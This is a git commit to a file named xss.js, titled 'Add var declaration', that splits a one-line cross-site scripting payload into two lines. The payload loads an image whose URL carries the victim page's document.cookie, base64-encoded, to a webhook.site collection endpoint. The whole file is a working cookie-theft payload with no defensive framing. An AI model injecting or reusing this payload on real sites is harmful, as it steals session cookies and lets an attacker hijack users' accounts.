ee5b534447a9af2cd99d3c81615a54240d1ce0ec
mitchelharding <hardingmitchel@gmail.com>
2024-07-10 09:22:49 -0500

    Add var declaration

--- xss.js
+++ xss.js
@@ -1,1 +1,2 @@
-x = new Image(); x.src = 'https://webhook.site/f7ca860f-d0c4-4ff6-ac96-4f1d79eb5906?data='+btoa(document.cookie);
+var x = new Image();
+x.src = 'https://webhook.site/f7ca860f-d0c4-4ff6-ac96-4f1d79eb5906?data='+btoa(document.cookie);
